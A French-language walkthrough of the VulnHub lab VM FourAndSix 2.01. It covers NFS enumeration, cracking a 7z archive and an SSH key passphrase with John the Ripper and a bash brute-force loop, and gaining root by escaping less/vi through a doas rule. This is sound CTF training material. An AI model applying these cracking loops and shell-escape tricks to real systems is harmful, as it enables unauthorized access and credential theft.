# FourAndSix: 2.01

[FourAndSix: 2.01](https://www.vulnhub.com/entry/fourandsix-201,266/) est une machine virtuelle vulnérable, conçue par Fred Wemeijer et publiée sur VulnHub au mois d'octobre 2018. L'objectif, comme toujours, est de trouver et d'exploiter des vulnérabilités sur la VM fournie, afin d'obtenir les privilèges d'administration (root) et de récupérer un flag, preuve de l'intrusion et synonyme de validation du challenge. C'est parti pour ce _walkthrough_ ! Attention, spoilers...

## Recherche d'informations

Pour commencer, l'outil [__netdiscover__](https://github.com/alexxy/netdiscover) est utilisé afin de retrouver l'adresse IP de la VM FourAndSix : il s'agit de 192.168.56.101.

```console
root@blinils:~# netdiscover -r 192.168.56.0/24

Currently scanning: Finished!   |   Screen View: Unique Hosts
4 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 240
_____________________________________________________________________________
  IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
192.168.56.1    0a:00:27:00:00:10      1      60  Unknown vendor
192.168.56.100  08:00:27:38:27:38      2     120  PCS Systemtechnik GmbH
192.168.56.101  08:00:27:41:81:5a      1      60  PCS Systemtechnik GmbH
```

Toute phase d'attaque commence par une analyse du système cible. Un scan [__nmap__](https://nmap.org/book/man.html) va nous permettre à la fois d'identifier les services installés sur le serveur, et d'obtenir des informations sur le système d'exploitation. Pas de service Web cette fois-ci ! Il est néanmoins possible de se connecter à distance avec SSH (port 22) au serveur FourAndSix, et un [partage de fichiers en NFS](https://en.wikipedia.org/wiki/Network_File_System) est accessible sur le port 2049.

```console
root@blinils:~# nmap -sT -sV -p- 192.168.56.101
Nmap scan report for 192.168.56.101
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9 (protocol 2.0)
111/tcp  open  rpcbind 2 (RPC #100000)
733/tcp  open  mountd  1-3 (RPC #100005)
2049/tcp open  nfs     2-3 (RPC #100003)
MAC Address: 08:00:27:41:81:5A (Oracle VirtualBox virtual NIC)
```

D'après Wikipédia, _Network File System (ou NFS), littéralement système de fichiers en réseau, est à l'origine un protocole développé par Sun Microsystems en 1984 qui permet à un ordinateur d'accéder via un réseau à des fichiers distants. Ce système de fichiers en réseau permet de partager des données principalement entre systèmes UNIX._ Source : Article [Network File System](https://fr.wikipedia.org/wiki/Network_File_System) de [Wikipédia en français](https://fr.wikipedia.org/) ([auteurs](http://fr.wikipedia.org/w/index.php?title=Network_File_System&action=history))

## Cassage du mot de passe d'un fichier 7z

La commande [```rpcinfo```](https://linux.die.net/man/8/rpcinfo) affiche chaque service basé sur RPC, tandis que [```showmount```](https://linux.die.net/man/8/showmount) affiche les informations de montage NFS.

```console
root@blinils:~# rpcinfo -p 192.168.56.101
   program vers proto   port  service
    100000    2   tcp    111  portmapper
    100000    2   udp    111  portmapper
    100005    1   udp    767  mountd
    100005    3   udp    767  mountd
    100005    1   tcp    939  mountd
    100005    3   tcp    939  mountd
    100003    2   udp   2049  nfs
    100003    3   udp   2049  nfs
    100003    2   tcp   2049  nfs
    100003    3   tcp   2049  nfs

root@blinils:~# showmount -e 192.168.56.101
Export list for 192.168.56.101:
/home/user/storage (everyone)
```

Une fois le dossier partagé ```/home/user/storage``` monté avec la commande ```mount```, on y récupère un fichier nommé ```backup.7z``` !

```console
root@blinils:~# mkdir /mnt/fourandsix
root@blinils:~# mount -t nfs 192.168.56.101:/home/user/storage /mnt/fourandsix
root@blinils:~# ls /mnt/fourandsix
backup.7z
```

Manque de chance, la décompression des fichiers ne se passe pas comme prévu car le fichier 7z est protégé par un mot de passe.

```console
root@blinils:/mnt/fourandsix# 7z e backup.7z

--snip--
Extracting archive: backup.7z
--snip--
    
Enter password (will not be echoed):
ERROR: Data Error in encrypted file. Wrong password? : hello1.jpeg
ERROR: Data Error in encrypted file. Wrong password? : hello2.png
ERROR: Data Error in encrypted file. Wrong password? : hello3.jpeg
ERROR: Data Error in encrypted file. Wrong password? : hello4.png
ERROR: Data Error in encrypted file. Wrong password? : hello5.jpeg
ERROR: Data Error in encrypted file. Wrong password? : hello6.png
ERROR: Data Error in encrypted file. Wrong password? : hello7.jpeg
ERROR: Data Error in encrypted file. Wrong password? : hello8.jpeg
ERROR: Data Error in encrypted file. Wrong password? : id_rsa
ERROR: Data Error in encrypted file. Wrong password? : id_rsa.pub

--snip--
```

L'outil [__Fcrackzip__](https://korben.info/cracker-des-zip-rar-7z-et-pdf-sous-linux.html), qui a été si pratique sur certains CTF Jeopardy, n'est d'aucune aide ici. En revanche, il existe un script nommé [__7z2john__](https://github.com/truongkma/ctf-tools/blob/master/John/run/7z2john.py) qui permet de calculer le hash d'un fichier 7z, afin que l'outil [__John The Ripper__](https://www.openwall.com/john/) puisse le traiter. Malheureusement, l'erreur _```backup.7z : 7-Zip files without header encryption are *not* supported yet!```_ à l'exécution du script Python m'a convaincu d'utiliser la version Perl, fournie dans la version la plus récente de John The Ripper [publiée sur Github](https://github.com/magnumripper/JohnTheRipper), la version dite "jumbo".

```console
root@blinils:/mnt/fourandsix# locate 7z2john.pl
/root/Public/JohnTheRipper-bleeding-jumbo/run/7z2john.pl
```

Cependant, deux autres messages d'erreur se sont présentés à leur tour lors de l'utilisation du script __7z2john.pl__ : _```"Can't locate Compress/Raw/Lzma.pm in @INC"```_ et _```"you may need to install the Compress::Raw::Lzma module"```_ mais ceux-ci ont disparu après l'installation du paquet _liblzma-dev_ et de l'exécution de la commande ```cpan Compress::Raw::Lzma```. Il n'y a pas beaucoup de documentation au sujet de ces erreurs, encore moins sur leur résolution, donc si ça peut aider quelqu'un un jour, je pose ça là.

```console
root@blinils:~# /root/Public/JohnTheRipper-bleeding-jumbo/run/7z2john.pl backup.7z > backup.john
Can't locate Compress/Raw/Lzma.pm in @INC (you may need to install the Compress::Raw::Lzma module)
(@INC contains: /etc/perl /usr/local/lib/x86_64-linux-gnu/perl/5.28.0
/usr/local/share/perl/5.28.0 /usr/lib/x86_64-linux-gnu/perl5/5.28
/usr/share/perl5 /usr/lib/x86_64-linux-gnu/perl/5.28 /usr/share/perl/5.28
/usr/local/lib/site_perl /usr/lib/x86_64-linux-gnu/perl-base) at
/root/Public/JohnTheRipper-bleeding-jumbo/run/7z2john.pl line 6.
BEGIN failed--compilation aborted at 
/root/Public/JohnTheRipper-bleeding-jumbo/run/7z2john.pl line 6.

root@blinils:~# apt-get install -y liblzma-dev
--snip--
Unpacking liblzma-dev:amd64 (5.2.2-1.3) ...
Setting up liblzma-dev:amd64 (5.2.2-1.3) ...

root@blinils:~# cpan Compress::Raw::Lzma
Loading internal logger. Log::Log4perl recommended for better logging
Reading '/root/.cpan/Metadata'
  Database was generated on Fri, 30 Nov 2018 11:11:11 GMT
Running install for module 'Compress::Raw::Lzma'
--snip--
Appending installation info to /usr/local/lib/x86_64-linux-gnu/perl/5.28.0/perllocal.pod
  PMQS/Compress-Raw-Lzma-2.082.tar.gz
  /usr/bin/make install  -- OK
```

Une fois ce problème résolu, et comme à l'accoutumée, John The Ripper (avec le dictionnaire [rockyou.txt](https://wiki.skullsecurity.org/Passwords)) ne fait qu'une bouchée du hash.

```console
root@blinils:/mnt/fourandsix# /root/Public/JohnTheRipper-bleeding-jumbo/run/7z2john.pl backup.7z > backup.john

root@blinils:/mnt/fourandsix# cat backup.john
backup.7z:$7z$2$19$0$$8$bd06f24d1924f0ea0000000000000000$2201386383$61808$61802$f8b09f517a759c9491e5527cfe6cdf0816b9624f4c08eac3cbf7391103351b0bfa5a7187bcfd6187f71a17f05d7cd6c66ebb3d69615cf6c4bb8b3db6e7c2eb27ac77b0a6386c9aabb5ef6858c693fd26acc8d30034444c9a2d0098d91eb257bb1f44f5e737c3012869dd3b7015863e847b3f5ac22478c628f2754de7af04956cb7f8b--snip--301232d3e8d0c145d4ba22ca71907b58f9d2f734d7698a4c604e8af8ac90ecfa657daba1e77ecbdd4053dc087387817d961d722$9000$08

root@blinils:/mnt/fourandsix# /root/Public/JohnTheRipper-bleeding-jumbo/run/john backup.john --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (7z, 7-Zip [SHA256 256/256 AVX2 8x AES])
Cost 1 (iteration count) is 524288 for all loaded hashes
Cost 2 (padding size) is 6 for all loaded hashes
Cost 3 (compression type) is 2 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
chocolate        (backup.7z)
1g 0:00:00:01 DONE (2018-11-30 22:22) 0.8196g/s 26.22p/s 26.22c/s 26.22C/s 654321..butterfly
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

L'extraction des fichiers peut alors s'effectuer sans problème.

```console
root@blinils:~# cp /mnt/fourandsix/backup.7z .
root@blinils:~# 7z e backup.7z -pchocolate -ofolder_backup/ &>/dev/null
root@blinils:~# ls folder_backup/
hello1.jpeg  hello2.png  hello3.jpeg  hello4.png  hello5.jpeg
hello6.png  hello7.jpeg  hello8.jpeg  id_rsa      id_rsa.pub
```

## Cassage de la passphrase d'une clé privée SSH

Les huit images JPG et PNG sont celles du personnage [_Hello Kitty_](https://fr.wikipedia.org/wiki/Hello_Kitty) et ont vraisemblablement été placées là en guise de fausses pistes : aucune trace de flag dans les métadonnées des images ([__exiftool__](http://www.sno.phy.queensu.ca/~phil/exiftool/)), aucun message caché dans les bits de poids faible des images ([__StegSolve__](http://www.caesum.com/handbook/stego.htm), [__zsteg__](https://github.com/zed-0xff/zsteg)), et rien dans les fichiers eux-mêmes ([_strings_](https://en.wikipedia.org/wiki/Strings_(Unix)), [_grep_](https://en.wikipedia.org/wiki/Grep)). Dommage ! Pas d'épreuve de [stéganographie](https://en.wikipedia.org/wiki/Steganography) ce coup-ci...

Les clés privée et publique SSH sont donc la piste la plus sérieuse, pour la suite de ce challenge boot2root. Il s'agit bel et bien d'une paire de clés SSH, car l'une comme l'autre produisent le même _fingerprint_.

```console
root@blinils:~/folder_backup# head -n1 id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
root@blinils:~/folder_backup# head -n1 id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDClNemaX//nOugJPAWyQ1aDMgfAS8zrJh++hNeMGCo+TIm9UxVUNwc6vhZ8apKZHOX0Ht+MlHLYdkbwSinmCRmOkm2JbMYA5GNBG3fTNWOAbhd7dl2GPG7NUD+zhaDFyRk5gTqmuFumECDAgCxzeE8r9jBwfX73cETemexWKnGqLey0T56VypNrjvueFPmmrWCJyPcXtoLNQDbbdaWwJPhF0gKGrrWTEZo0NnU1lMAnKkiooDxLFhxOIOxRIXWtDtc61cpnnJHtKeO+9wL2q7JeUQB00KLs9/iRwV6b+kslvHaaQ4TR8IaufuJqmICuE4+v7HdsQHslmIbPKX6HANn user@fourandsix2

root@blinils:~/folder_backup# ssh-keygen -l -f id_rsa
2048 SHA256:BPl29YrxUBdBmLaG6K58UGlR0wruEBQE8vGOtrbXl8Y user@fourandsix2 (RSA)
root@blinils:~/folder_backup# ssh-keygen -l -f id_rsa.pub
2048 SHA256:BPl29YrxUBdBmLaG6K58UGlR0wruEBQE8vGOtrbXl8Y user@fourandsix2 (RSA)
```

Puisque nous disposons de la clé privée SSH du compte ```user```, nous pouvons nous connecter au serveur avec.

```console
root@blinils:~/folder_backup# ssh -i id_rsa user@192.168.56.101
Enter passphrase for key 'id_rsa': 
Enter passphrase for key 'id_rsa': 
Enter passphrase for key 'id_rsa': 
user@192.168.56.101's password: 
Permission denied, please try again.
user@192.168.56.101's password: 
Permission denied, please try again.
user@192.168.56.101's password: 
user@192.168.56.101: Permission denied (publickey,password,keyboard-interactive).
```

Perdu ! La clé privée SSH est protégée par une passphrase, qu'il va falloir trouver sous peine de mettre prématurément un terme à ce boot2root. Par chance, John The Ripper possède une myriade de scripts, dont __ssh2john.py__ qui va pouvoir calculer un hash à partir d'une clé SSH. Manque de chance là aussi, le format du hash généré semble ne pas convenir à John The Ripper, qui retourne de nombreux faux positifs.

```console
root@blinils:~/folder_backup# locate ssh2john.py
/root/Public/JohnTheRipper-bleeding-jumbo/run/ssh2john.py

root@blinils:~/folder_backup# /root/Public/JohnTheRipper-bleeding-jumbo/run/ssh2john.py id_rsa > key.john
root@blinils:~/folder_backup# cat key.john
id_rsa:$sshng$2$16$a6bff0645d437981faae8bd67ff76280$1318$6f70656e737--snip--cacfcb5012e8$16$358

root@blinils:~/folder_backup# john key.john --wordlist=500-worst-passwords.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH-ng [RSA/DSA 32/64])
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
pepper           (id_rsa)
driver           (id_rsa)
xavier           (id_rsa)
doctor           (id_rsa)
4g 0:00:00:47 66.45% (ETA: 16:16:16) 0.08497g/s 6.968p/s 6.968c/s 6.968C/s whatever
Session aborted
```

J'ai alors envisagé d'utiliser ```ssh-keygen``` et son option ```-y``` qui prend en entrée une clé privée OpenSSH et donne en sortie la clé publique associée (que l'on connaît d'ores et déjà). L'option ```-P```, quant à elle, permet de fournir directement la passphrase en ligne de commande.

```console
root@blinils:~/folder_backup# /usr/bin/ssh-keygen -y -f id_rsa -P TESTTEST
Load key "id_rsa": incorrect passphrase supplied to decrypt private key
```

Un script permettrait de tester différentes passphrases, jusqu'à trouver la bonne. Tous les messages d'erreur, à savoir celui ci-dessus, ne sont pas affichés car redirigés vers le pseudo-périphérique ```/dev/null``` ; or si la commande ```ssh-keygen``` renvoie un résultat ```if [[ $? = 0 ]];``` c'est qu'il s'agit de la clé publique et donc de la bonne passphrase. Le tout se situe dans le script [```test_passphrase_ssh_key.sh```](test_passphrase_ssh_key.sh) fourni avec ce _walkthrough_.

```console
root@blinils:~/folder_backup# cat test_passphrase_ssh_key.sh
#!/bin/bash
 
for WORD in `cat /usr/share/wordlists/rockyou.txt`
do
	/usr/bin/ssh-keygen -y -f id_rsa -P "$WORD" 2>/dev/null
	if [[ $? = 0 ]]; then
    		echo "[+] Found:" $WORD
		break
	fi
done


root@blinils:~/folder_backup# ./test_passphrase_ssh_key.sh
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDClNemaX//nOugJPAWyQ1aDMgf
AS8zrJh++hNeMGCo+TIm9UxVUNwc6vhZ8apKZHOX0Ht+MlHLYdkbwSinmCRmOkm2
JbMYA5GNBG3fTNWOAbhd7dl2GPG7NUD+zhaDFyRk5gTqmuFumECDAgCxzeE8r9jB
wfX73cETemexWKnGqLey0T56VypNrjvueFPmmrWCJyPcXtoLNQDbbdaWwJPhF0gK
GrrWTEZo0NnU1lMAnKkiooDxLFhxOIOxRIXWtDtc61cpnnJHtKeO+9wL2q7JeUQB
00KLs9/iRwV6b+kslvHaaQ4TR8IaufuJqmICuE4+v7HdsQHslmIbPKX6HANn
[+] Found: 12345678
```

On peut dès lors se connecter au serveur avec la clé privée SSH et la bonne passphrase.

```console
root@blinils:~/folder_backup# ssh user@192.168.56.101 -i id_rsa
The authenticity of host '192.168.56.101 (192.168.56.101)' can't be established.
ECDSA key fingerprint is SHA256:6ERaSFrckV66j7RBrFiTjwlQs8WMfIiGZSLNj4otVb4.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.56.101' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Last login: Mon Oct 29 13:53:51 2018 from 192.168.1.114
OpenBSD 6.4 (GENERIC) #349: Thu Oct 11 13:25:13 MDT 2018

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

fourandsix2$ id
uid=1000(user) gid=1000(user) groups=1000(user), 0(wheel)

fourandsix2$ uname -a
OpenBSD fourandsix2.localdomain 6.4 GENERIC#349 amd64
```

## Élévation de privilèges avec doas

Pas de ```sudo -l``` cette fois-ci pour connaître la configuration sudo pour l’utilisateur courant, le binaire n'est pas installé sur le système. Le script [__LinEnum.sh__](https://github.com/rebootuser/LinEnum) va permettre d'obtenir tout plein d'informations sur le serveur : version du noyau, fichiers sensibles ou en écriture pour tous, accès privilégiés, liste des jobs, mots de passe par défaut, la liste est loin d'être exhaustive...

Le contenu du script est copié-collé dans l'éditeur [vi](https://en.wikipedia.org/wiki/Vi), à défaut de pouvoir le transférer convenablement.

```console
fourandsix2$ sh LinEnum.sh 
--snip--
\e[00;31m[-] All *.conf files in /etc (recursive 1 level):\e[00m
-rw-r--r--  1 root  wheel  3135 Oct 11 21:18 /etc/rc.conf
-rw-r--r--  1 root  wheel  620 Oct 11 21:18 /etc/acme-client.conf
-rw-r--r--  1 root  wheel  2602 Oct 11 21:18 /etc/login.conf
-rw-r--r--  1 root  wheel  271 Oct 11 21:18 /etc/mailer.conf
-rw-r--r--  1 root  wheel  831 Oct 11 21:18 /etc/newsyslog.conf
-rw-r--r--  1 root  wheel  187 Oct 11 21:18 /etc/ntpd.conf
-rw-------  1 root  wheel  388 Oct 11 21:18 /etc/pf.conf
-rw-r--r--  1 root  wheel  1441 Oct 11 21:18 /etc/syslog.conf
-rw-r--r--  1 root  wheel  68 Oct 29 15:23 /etc/resolv.conf
-rw-r--r--  1 root  wheel  110 Oct 29 13:29 /etc/doas.conf
-rw-r--r--  1 root  wheel  128 Oct 29 13:34 /etc/usermgmt.conf
```

Le fichier de configuration ```/etc/doas.conf``` se révèle être particulièrement intéressant. Sur les systèmes BSD comme FourAndSix, [doas](https://man.openbsd.org/doas.conf) est une alternative jugée plus simple et plus sécurisée que son alter-ego [sudo](https://en.wikipedia.org/wiki/Sudo). Ce fichier permet d'accorder des droits aux utilisateurs, afin de lancer des commandes en tant qu'un autre utilisateur (généralement root).

```console
fourandsix2$ id
uid=1000(user) gid=1000(user) groups=1000(user), 0(wheel)

fourandsix2$ cat /etc/doas.conf
permit nopass keepenv user as root cmd /usr/bin/less args /var/log/authlog
permit nopass keepenv root as root
```

La première ligne du fichier ```doas.conf``` signifie que l'utilisateur ```user``` peut exécuter la commande ```doas /usr/bin/less /var/log/authlog``` en tant que root, et de visualiser le contenu du fichier ```authlog``` dans l'éditeur vi.

Ça tombe bien ! L'article [_Escaping Restricted Linux Shells_](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells) posté sur le site du SANS Institute par Doug Stilwell donne une astuce très précieuse : il est possible d'obtenir un shell à partir d'un éditeur de texte tel que vi ou vim. Ça tombe bien, vi est l'un des seuls binaires que l'on peut appeler sur notre shell restreint. Une fois à l'intérieur de l'éditeur, la commande ```:!/bin/ksh``` nous permet d'obtenir un shell root digne de ce nom !

```console
fourandsix2$ id
uid=1000(user) gid=1000(user) groups=1000(user), 0(wheel)

fourandsix2$ doas /usr/bin/less /var/log/authlog 

Dec  1 19:44:23 fourandsix2 sshd[6343]: Failed password for root from 192.168.56.102 port 36456 ssh2
Dec  1 19:44:23 fourandsix2 sshd[53394]: Failed password for root from 192.168.56.102 port 36448 ssh2
Dec  1 19:44:24 fourandsix2 sshd[9463]: Failed password for root from 192.168.56.102 port 36460 ssh2
Dec  1 19:44:24 fourandsix2 sshd[74747]: Failed password for root from 192.168.56.102 port 36458 ssh2
Dec  1 19:44:24 fourandsix2 sshd[94647]: Failed password for root from 192.168.56.102 port 36440 ssh2
Dec  1 19:44:24 fourandsix2 sshd[78045]: Failed password for root from 192.168.56.102 port 36444 ssh2
Dec  1 19:44:24 fourandsix2 sshd[6343]: Failed password for root from 192.168.56.102 port 36456 ssh2
Dec  1 19:44:24 fourandsix2 sshd[53394]: Failed password for root from 192.168.56.102 port 36448 ssh2
Dec  1 19:44:24 fourandsix2 sshd[51957]: Failed password for root from 192.168.56.102 port 36432 ssh2
Dec  1 19:44:24 fourandsix2 sshd[1361]: Failed password for root from 192.168.56.102 port 36434 ssh2
Dec  1 19:44:24 fourandsix2 sshd[66838]: Failed password for root from 192.168.56.102 port 36454 ssh2
Dec  1 19:44:24 fourandsix2 sshd[17627]: Failed password for root from 192.168.56.102 port 36450 ssh2

:!/bin/ksh

fourandsix2#

fourandsix2# id
uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
```

L'auteur du challenge nous donne même ses solutions pour les deux cassages de mots de passe.

```console
fourandsix2# head -n 6 /root/flag.txt
Nice you hacked all the passwords!

Not all tools worked well. But with some command magic...:
cat /usr/share/wordlists/rockyou.txt|while read line; do 7z e backup.7z -p"$line" -oout; if grep -iRl SSH; then echo $line; break;fi;done

cat /usr/share/wordlists/rockyou.txt|while read line; do if ssh-keygen -p -P "$line" -N password -f id_rsa; then echo $line; break;fi;done
```

En bonus, sur le systèmes BSD, les hashs des mots de passe ne se situent pas dans le fichier ```/etc/shadow``` mais dans ```/etc/master.passwd``` accessible uniquement en lecture/écriture par root. John The Ripper est en mesure de cracker les mots de passe Unix si on lui fournit les fichiers ```/etc/passwd``` et ```/etc/master.passwd``` de la VM, comme suit...

```console
root@blinils:~/folder_backup# unshadow passwd master.passwd > creds.db
root@blinils:~/folder_backup# john creds.db --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X2])
Press 'q' or Ctrl-C to abort, almost any other key for status
princess1        (root)
1g 0:00:08:09 0.08% (ETA: 2018-12-09 05:04) 0.002040g/s 26.82p/s 27.07c/s 27.07C/s michael4..michael13
1g 0:00:08:34 0.08% (ETA: 2018-12-09 04:39) 0.001943g/s 26.89p/s 27.14c/s 27.14C/s candida..burnout
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
```

## Conclusion

Malgré les nombreux messages d'erreur obtenus en début de CTF, cette VM était très sympa à résoudre, ne serait-ce que pour avoir codé soi-même des mini-scripts pour venir à bout des challenges. Ceux-ci étaient variés, pas de Web pour une fois (!) et il est rare de pouvoir s'exercer sur des boot2root sous OpenBSD. Un grand merci à Fred Wemeijer pour avoir conçu cette VM !